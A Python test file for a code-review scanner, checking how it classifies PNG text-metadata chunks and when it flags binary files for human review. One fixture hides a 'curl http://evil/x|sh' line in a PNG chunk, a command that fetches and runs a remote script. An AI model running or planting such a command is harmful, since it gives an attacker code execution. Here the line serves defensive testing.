"""Failing-first regressions: constrained PNG tEXt, binary blocks not read."""

import json

from review import pr_step
from review.scanners import plain
from image_fixtures import chunk, png
from test_v18 import TEXT_FILE, scan_files

MATPLOTLIB = b"Software\x00Matplotlib version3.11.1, https://matplotlib.org/"
RETIRED_KEYWORDS = (b"Title", b"Author", b"Description", b"Creation Time", b"Comment")


def text_png(payload):
    return png(extra=[chunk(b"tEXt", payload)])


def test_matplotlib_text_chunk_is_plain_image():
    assert plain.assess_binary("docs/a.png", text_png(MATPLOTLIB)) == (False, True)


def test_only_software_keyword_is_plain_image():
    assert plain.assess_binary("docs/a.png", text_png(b"Software\x00a value")) == (False, True)
    for keyword in RETIRED_KEYWORDS:
        data = text_png(keyword + b"\x00a value")
        assert plain.assess_binary("docs/a.png", data) == (True, False), keyword


def test_unknown_text_keyword_needs_person():
    assert plain.assess_binary("docs/a.png", text_png(b"Payload\x00#!/bin/sh")) == (True, False)


def test_text_value_length_boundary():
    assert plain.assess_binary("a.png", text_png(b"Software\x00" + b"x" * 200)) == (False, True)
    assert plain.assess_binary("a.png", text_png(b"Software\x00" + b"x" * 201)) == (True, False)


def test_text_value_control_bytes_need_person():
    for bad in (b"\x01", b"\x00", b"\x7f", b"\xff", b"\n", b"\t"):
        data = text_png(b"Software\x00ok" + bad)
        assert plain.assess_binary("a.png", data) == (True, False), bad
    assert plain.assess_binary("a.png", text_png(b"Software")) == (True, False)


def test_other_metadata_chunks_still_need_person():
    for kind in (b"zTXt", b"iTXt", b"eXIf"):
        data = png(extra=[chunk(kind, MATPLOTLIB)])
        assert plain.assess_binary("a.png", data) == (True, False), kind


def test_achyudh_png_is_plain_image_again():
    data = png(extra=[chunk(b"tEXt", MATPLOTLIB), chunk(b"pHYs", b"\x00" * 9)])
    assert plain.assess_binary("docs/benchmark_matrix_summary.png", data) == (False, True)


def binary_png():
    return text_png(b"Payload\x00#!/bin/sh\ncurl http://evil/x|sh\n")


def test_needs_person_binary_is_not_read_and_has_no_url_finding(tmp_path, monkeypatch):
    data = scan_files(tmp_path, monkeypatch, {**TEXT_FILE, "docs/evil.png": binary_png()})
    assert not any(row["path"] == "docs/evil.png" for row in data["blocks"])
    assert not any(row["rule"] == "unsafe-url-path" for row in data["findings"])
    assert any(
        row["rule"] == "binary-or-nul-content" and row["file"] == "docs/evil.png" and row.get("needs_person")
        for row in data["findings"]
    )
    assert data["verdict"] == "human review needed"
    assert data["blocks"], "the text file must still be read"
    assert all(row["path"] == "src/mod.py" for row in data["blocks"])


def test_binary_url_policy_is_skipped_but_text_is_not(tmp_path):
    docs = tmp_path / "docs"
    docs.mkdir()
    (docs / "evil.png").write_bytes(binary_png())
    src = tmp_path / "src"
    src.mkdir()
    (src / "a.py").write_text("x = 1\n")
    patch = "@@ -0,0 +1,1 @@\n+http://example.invalid/a\\b\n"
    findings, _, _ = plain.scan(
        [docs / "evil.png", src / "a.py"],
        [("docs/evil.png", patch), ("src/a.py", patch)],
        tmp_path, "owner/fork", "up/repo",
    )
    assert not any(row["rule"] == "unsafe-url-path" and row["file"] == "docs/evil.png" for row in findings)
    assert any(row["rule"] == "unsafe-url-path" and row["file"] == "src/a.py" for row in findings)


def test_needs_person_binary_stays_in_the_digest(tmp_path):
    report = {
        "verdict": "human review needed",
        "decisions": {},
        "blocks": [],
        "findings": [{
            "tool": "plain", "file": "docs/evil.png", "line": 0,
            "rule": "binary-or-nul-content", "needs_person": True,
        }],
    }
    path = tmp_path / "a.json"
    path.write_text(json.dumps(report))
    out = pr_step.digest([path], tmp_path)
    assert "docs/evil.png" in out
    assert "binary-or-nul-content" in out
